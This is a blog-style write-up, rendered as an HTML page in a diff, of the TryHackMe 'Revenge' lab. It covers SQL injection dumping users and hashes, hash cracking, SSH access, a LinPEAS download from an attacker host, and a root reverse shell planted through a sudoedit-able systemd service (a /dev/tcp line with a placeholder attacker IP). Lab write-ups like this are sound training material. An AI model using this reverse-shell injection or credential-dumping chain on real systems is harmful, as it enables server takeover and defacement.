@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Revenge · &lt;Rxfa/&gt;
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Rxfa">
+<meta name="description" content="This is revenge! You&rsquo;ve been hired by Billy Joel to break into and deface the Rubber Ducky Inc. web application. He was fired for probably good reasons but who cares, you&rsquo;re just here for the money. Can you fulfill your end of the bargain? Link to heading Approach Link to heading Reconnaissance &amp; Enumeration Link to heading So, we start of by read the message Billy Joel left us to read and this is what we find:">
+<meta name="keywords" content="blog,developer,personal">
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Revenge"/>
+<meta name="twitter:description" content="This is revenge! You&rsquo;ve been hired by Billy Joel to break into and deface the Rubber Ducky Inc. web application. He was fired for probably good reasons but who cares, you&rsquo;re just here for the money. Can you fulfill your end of the bargain? Link to heading Approach Link to heading Reconnaissance &amp; Enumeration Link to heading So, we start of by read the message Billy Joel left us to read and this is what we find:"/>
+
+<meta property="og:title" content="Revenge" />
+<meta property="og:description" content="This is revenge! You&rsquo;ve been hired by Billy Joel to break into and deface the Rubber Ducky Inc. web application. He was fired for probably good reasons but who cares, you&rsquo;re just here for the money. Can you fulfill your end of the bargain? Link to heading Approach Link to heading Reconnaissance &amp; Enumeration Link to heading So, we start of by read the message Billy Joel left us to read and this is what we find:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/tryhackme-revenge/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-17T23:36:23+00:00" />
+<meta property="article:modified_time" content="2024-03-17T23:36:23+00:00" />
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/tryhackme-revenge/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      &lt;Rxfa/&gt;
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/tryhackme-revenge/">
+              Revenge
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2024-03-17T23:36:23Z">
+                March 17, 2024
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              8-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/rxfa/">Rxfa</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/categories/writeups/">Writeups</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/medium/">Medium</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/tryhackme/">TryHackMe</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/web/">Web</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <h1 id="this-is-revenge-youve-been-hired-by-billy-joel-to-break-into-and-deface-the-rubber-ducky-inc-web-application-he-was-fired-for-probably-good-reasons-but-who-cares-youre-just-here-for-the-money-can-you-fulfill-your-end-of-the-bargain">
+  This is revenge! You&rsquo;ve been hired by Billy Joel to break into and deface the Rubber Ducky Inc. web application. He was fired for probably good reasons but who cares, you&rsquo;re just here for the money. Can you fulfill your end of the bargain?
+  <a class="heading-link" href="#this-is-revenge-youve-been-hired-by-billy-joel-to-break-into-and-deface-the-rubber-ducky-inc-web-application-he-was-fired-for-probably-good-reasons-but-who-cares-youre-just-here-for-the-money-can-you-fulfill-your-end-of-the-bargain">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="approach">
+  Approach
+  <a class="heading-link" href="#approach">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="reconnaissance--enumeration">
+  Reconnaissance &amp; Enumeration
+  <a class="heading-link" href="#reconnaissance--enumeration">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>So, we start of by read the message Billy Joel left us to read and this is what we find:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>To whom it may concern,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
+</span></span><span style="display:flex;"><span>and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
+</span></span><span style="display:flex;"><span>I&#39;ve done some initial enumeration of the site because I know *some* things about hacking but not enough.  
+</span></span><span style="display:flex;"><span>For that reason, I&#39;ll let you do your own enumeration and checking.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>What I want you to do is simple.  Break into the server that&#39;s running the website and deface the front page.  
+</span></span><span style="display:flex;"><span>I don&#39;t care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don&#39;t want to cause irreparable damage.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>When you finish the job, you&#39;ll get the rest of your payment.  We agreed upon $5,000.  
+</span></span><span style="display:flex;"><span>Half up-front and half when you finish.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Good luck,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Billy
+</span></span></code></pre></div><p>Sounds pretty simple:</p>
+<ul>
+<li>get into Rubber Ducky Inc&rsquo;s server</li>
+<li>deface their front page</li>
+<li>get the remaining 2500$</li>
+</ul>
+<p><img src="/gifs/lets-go.gif" alt="Drake - Let&rsquo;s go"></p>
+<p>As it should be done in every CTF, we start by getting more information about the operating system and services that our target is running and our tool of choice for that is going to be Nmap.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Nmap scan report for 10.10.0.101
+</span></span><span style="display:flex;"><span>Host is up (0.11s latency).
+</span></span><span style="display:flex;"><span>Not shown: 998 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.14.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 10.97 seconds
+</span></span></code></pre></div><p>Our Nmap scan reveals SSH and HTTP services running on ports 22 and 80, respectively.</p>
+<p>As I&rsquo;ve said before, information is king and we need to try to make sure we don&rsquo;t miss any hidden directory or file, and the tool we use for that is Gobuster.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Gobuster v3.5
+</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>[+] Url:                     http://10.10.0.101
+</span></span><span style="display:flex;"><span>[+] Method:                  GET
+</span></span><span style="display:flex;"><span>[+] Threads:                 10
+</span></span><span style="display:flex;"><span>[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span><span style="display:flex;"><span>[+] Negative Status codes:   404
+</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.5
+</span></span><span style="display:flex;"><span>[+] Timeout:                 10s
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>2024/03/18 01:41:18 Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>/admin                (Status: 200) [Size: 4983]
+</span></span><span style="display:flex;"><span>/contact              (Status: 200) [Size: 6906]
+</span></span><span style="display:flex;"><span>/login                (Status: 200) [Size: 4980]
+</span></span><span style="display:flex;"><span>/static               (Status: 301) [Size: 194] [--&gt; http://10.10.0.101/static/]
+</span></span><span style="display:flex;"><span>/products             (Status: 200) [Size: 7254]
+</span></span><span style="display:flex;"><span>/index                (Status: 200) [Size: 8541]
+</span></span><span style="display:flex;"><span>Progress: 23975 / 30001 (79.91%)[ERROR] 2024/03/18 01:47:29 [!] parse &#34;http://10.10.0.101/error\x1f_log&#34;: net/url: invalid control character in URL
+</span></span><span style="display:flex;"><span>Progress: 29997 / 30001 (99.99%)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>2024/03/18 01:49:19 Finished
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span></code></pre></div><p>Gobuster uncovers here a secret admin login page, suggesting potential avenues for exploitation.
+But that quick turns out to be all bark and no bite, since the login form led to a dead link(same for the login page).</p>
+<p><img src="/images/922381.png" alt="admin page"></p>
+<p>The two login pages we found lead us nowhere and we are running out of attack vectors as this application is very limited from the functionality standpoint.</p>
+<p>We turn our attention to the products page and to the fact that it is possible look at each product in more detail, making it possible for us to try to find and exploit vulnerabilities such as <a href="https://portswigger.net/web-security/sql-injection"  class="external-link" target="_blank" rel="noopener">SQL Injections</a>, <a href="https://brightsec.com/blog/local-file-inclusion-lfi/"  class="external-link" target="_blank" rel="noopener">Local File Inclusions</a> or <a href="https://portswigger.net/web-security/access-control/idor"  class="external-link" target="_blank" rel="noopener">Insecure Direct Object References (IDORs)</a>.</p>
+<p>We start by trying to find out if there&rsquo;s a SQLi we can exploit, for that we run SQLmap that tells us that this web application is indeed vulnerable to SQL Injections and this is how we get our 1st flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Database: duckyinc
+</span></span><span style="display:flex;"><span>Table: user
+</span></span><span style="display:flex;"><span>[10 entries]
+</span></span><span style="display:flex;"><span>+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
+</span></span><span style="display:flex;"><span>| id | email                           | company          | username | _password                                                    | credit_card                |
+</span></span><span style="display:flex;"><span>+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
+</span></span><span style="display:flex;"><span>| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
+</span></span><span style="display:flex;"><span>| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
+</span></span><span style="display:flex;"><span>| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
+</span></span><span style="display:flex;"><span>| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
+</span></span><span style="display:flex;"><span>| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
+</span></span><span style="display:flex;"><span>| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | ************************** |
+</span></span><span style="display:flex;"><span>| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
+</span></span><span style="display:flex;"><span>| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
+</span></span><span style="display:flex;"><span>| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
+</span></span><span style="display:flex;"><span>| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+</span></span><span style="display:flex;"><span>+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
+</span></span></code></pre></div><p><img src="/gifs/vince-mc-mahon-stacy-keibler.gif" alt="Vince Mcmahon GIF"></p>
+<p><strong>Nice!</strong></p>
+<p>There&rsquo;s not much we can do with the list of users of the website since all the login pages are dead, but there is this other table that gets our attention.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Database: duckyinc
+</span></span><span style="display:flex;"><span>Table: system_user
+</span></span><span style="display:flex;"><span>[3 entries]
+</span></span><span style="display:flex;"><span>+----+----------------------+--------------+--------------------------------------------------------------+
+</span></span><span style="display:flex;"><span>| id | email                | username     | _password                                                    |
+</span></span><span style="display:flex;"><span>+----+----------------------+--------------+--------------------------------------------------------------+
+</span></span><span style="display:flex;"><span>| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
+</span></span><span style="display:flex;"><span>| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
+</span></span><span style="display:flex;"><span>| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+</span></span><span style="display:flex;"><span>+----+----------------------+--------------+--------------------------------------------------------------+
+</span></span></code></pre></div><p>Going by the name of the table <del>and a user whose name is literally server-admin</del>, we can assume that this is some kind of table of admins that have accounts in our target&rsquo;s machine.</p>
+<p>So now we have in 3 hashes in hands that we can try to crack and then use to establish an SSH connection to our target(that is the only thing we can latch on to considering that all the login pages are dead).</p>
+<p>With the help of hashcat we manage to crack server-admin&rsquo;s hash and are able to login in our target machine with those credentials.</p>
+<h3 id="initial-access">
+  Initial Access
+  <a class="heading-link" href="#initial-access">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>We are able to login as server-admin, And we get our 2nd flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>server-admin@duckyinc:~$ ls
+</span></span><span style="display:flex;"><span>flag2.txt
+</span></span><span style="display:flex;"><span>server-admin@duckyinc:~$ cat flag2.txt 
+</span></span><span style="display:flex;"><span>*****************
+</span></span></code></pre></div><p>We go to the /templates folder to deface Rubber Ducky Inc&rsquo;s front page just as our friend Billy asked us and find out that we do not have write permissions on any file of that folder.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>server-admin@duckyinc:~$ ls -la /var/www/duckyinc/templates/
+</span></span><span style="display:flex;"><span>total <span style="color:#a5d6ff">48</span>
+</span></span><span style="display:flex;"><span>drwxr-x--- <span style="color:#a5d6ff">2</span> flask-app www-data <span style="color:#a5d6ff">4096</span> Mar <span style="color:#a5d6ff">18</span> 04:01 .
+</span></span><span style="display:flex;"><span>drwxr-x--- <span style="color:#a5d6ff">5</span> flask-app www-data <span style="color:#a5d6ff">4096</span> Mar <span style="color:#a5d6ff">18</span> 04:00 ..
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#a5d6ff">1</span> flask-app www-data  <span style="color:#a5d6ff">768</span> Aug  <span style="color:#a5d6ff">9</span>  <span style="color:#a5d6ff">2020</span> 404.html
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#a5d6ff">1</span> flask-app www-data  <span style="color:#a5d6ff">759</span> Aug  <span style="color:#a5d6ff">9</span>  <span style="color:#a5d6ff">2020</span> 500.html
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#a5d6ff">1</span> flask-app www-data <span style="color:#a5d6ff">1231</span> Aug  <span style="color:#a5d6ff">9</span>  <span style="color:#a5d6ff">2020</span> admin.html
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#a5d6ff">1</span> flask-app www-data <span style="color:#a5d6ff">4509</span> Aug  <span style="color:#a5d6ff">9</span>  <span style="color:#a5d6ff">2020</span> base.html
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#a5d6ff">1</span> flask-app www-data <span style="color:#a5d6ff">3506</span> Aug  <span style="color:#a5d6ff">9</span>  <span style="color:#a5d6ff">2020</span> contact.html
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#a5d6ff">1</span> root      www-data   <span style="color:#a5d6ff">16</span> Mar <span style="color:#a5d6ff">18</span> 04:01 index.html
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#a5d6ff">1</span> flask-app www-data <span style="color:#a5d6ff">1225</span> Aug  <span style="color:#a5d6ff">9</span>  <span style="color:#a5d6ff">2020</span> login.html
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#a5d6ff">1</span> flask-app www-data <span style="color:#a5d6ff">1280</span> Aug  <span style="color:#a5d6ff">9</span>  <span style="color:#a5d6ff">2020</span> product.html
+</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#a5d6ff">1</span> flask-app www-data <span style="color:#a5d6ff">3654</span> Aug  <span style="color:#a5d6ff">9</span>  <span style="color:#a5d6ff">2020</span> products.html
+</span></span></code></pre></div><p>So it looks like we need to get root access to get our well-deserved 2500$.
+Since we have no information on possible PE vectors we download LinPEAS from our machine to the target&rsquo;s.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rxfa@attacker:~/Desktop/CTFs$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+</span></span><span style="display:flex;"><span>rxfa@attacker:~/Desktop/CTFs$ python3 -m http.server
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#a5d6ff">8000</span> <span style="color:#ff7b72;font-weight:bold">(</span>http://0.0.0.0:8000/<span style="color:#ff7b72;font-weight:bold">)</span>...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>server-admin@duckyinc$:~<span style="color:#79c0ff">$cd</span> /tmp
+</span></span><span style="display:flex;"><span>server-admin@duckyinc$:/tmp$ wget http://&lt;attacker_ip&gt;:8000/linpeas.sh
+</span></span><span style="display:flex;"><span>server-admin@duckyinc$:/tmp$ chmod <span style="color:#a5d6ff">777</span> ./linpeas.sh &amp; ./linpeas.sh
+</span></span></code></pre></div><p>Thankfully, LinPEAS is able to point us in the right direction and points to us that we probably have a PE vector in the duckyinc service by using the sudoedit command</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>╔══════════╣ Checking <span style="color:#a5d6ff">&#39;sudo -l&#39;</span>, /etc/sudoers, and /etc/sudoers.d
+</span></span><span style="display:flex;"><span>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff7b72">for</span> server-admin on duckyinc:
+</span></span><span style="display:flex;"><span>env_reset, mail_badpass, <span style="color:#79c0ff">secure_path</span><span style="color:#ff7b72;font-weight:bold">=</span>/usr/local/sbin<span style="color:#79c0ff">\:</span>/usr/local/bin<span style="color:#79c0ff">\:</span>/usr/sbin<span style="color:#79c0ff">\:</span>/usr/bin<span style="color:#79c0ff">\:</span>/sbin<span style="color:#79c0ff">\:</span>/bin<span style="color:#79c0ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User server-admin may run the following commands on duckyinc:
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
+</span></span></code></pre></div><p>So we know that duckyinc is a systemd service configuration file that manages a Gunicorn instance to serve Ducky inc web application. And we know that <del>fortunately</del> we edit the file as we please, so the play here is to change it so we inject a reverse shell payload in the service and get root access to the machine in that way.</p>
+<p>This is how we edit the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>Unit<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">Description</span><span style="color:#ff7b72;font-weight:bold">=</span>Gunicorn instance to serve DuckyInc Webapp
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">After</span><span style="color:#ff7b72;font-weight:bold">=</span>network.target
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>Service<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">User</span><span style="color:#ff7b72;font-weight:bold">=</span>root
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">Group</span><span style="color:#ff7b72;font-weight:bold">=</span>www-data
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">WorkingDirectory</span><span style="color:#ff7b72;font-weight:bold">=</span>/var/www/duckyinc
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">ExecStart</span><span style="color:#ff7b72;font-weight:bold">=</span>/usr/local/bin/gunicorn --workers <span style="color:#a5d6ff">3</span> --bind<span style="color:#ff7b72;font-weight:bold">=</span>unix:/var/www/duckyinc/duckyinc.sock --timeout <span style="color:#a5d6ff">60</span> -m <span style="color:#a5d6ff">007</span> app:app
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">ExecReload</span><span style="color:#ff7b72;font-weight:bold">=</span>/bin/kill -s HUP <span style="color:#79c0ff">$MAINPID</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">ExecStop</span><span style="color:#ff7b72;font-weight:bold">=</span>/bin/kill -s TERM <span style="color:#79c0ff">$MAINPID</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">ExecStartPost</span><span style="color:#ff7b72;font-weight:bold">=</span>/bin/bash -c <span style="color:#a5d6ff">&#34;/bin/sh -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;1234&gt; 0&gt;&amp;1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>Install<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">WantedBy</span><span style="color:#ff7b72;font-weight:bold">=</span>multi-user.target
+</span></span></code></pre></div><p>Now we just need to set up a listener.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rxfa@attacker:~/Desktop/CTFs$ nc -lnvp <span style="color:#a5d6ff">1234</span>
+</span></span><span style="display:flex;"><span>Ncat: Version 7.94 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org/ncat <span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Ncat: Listening on <span style="color:#ff7b72;font-weight:bold">[</span>::<span style="color:#ff7b72;font-weight:bold">]</span>:1234
+</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:1234
+</span></span></code></pre></div><p>Now, we restart the duckyinc.service and have our reverse shell connecting back with our attacker machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>server-admin@duckyinc:/tmp$ sudo systemctl daemon-reload
+</span></span><span style="display:flex;"><span>server-admin@duckyinc:/tmp$ sudo systemctl restart duckyinc.service
+</span></span></code></pre></div><h3 id="root-access">
+  Root Access
+  <a class="heading-link" href="#root-access">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>And there it is!</p>
+<p>We got root access.</p>
+<p>Now we can deface Ducky Inc&rsquo;s front page(which is done by changing the index.html file in the /templates folder in any way really) and get the last flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Ncat: Connection from 10.10.50.133:34254.
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#f85149">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># cd /root</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># ls</span>
+</span></span><span style="display:flex;"><span>flag3.txt
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># cat ./flag3.txt  </span>
+</span></span><span style="display:flex;"><span>************************* 
+</span></span></code></pre></div><p>With all objectives completed, including the defacement of the front page, we&rsquo;ve successfully completed our mission and secured our reward.</p>
+<p>This concludes our adventure in exacting revenge upon Rubber Ducky Inc., as commissioned by none other than Billy Joel.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2024
+     Rxfa 
+    ·
+    
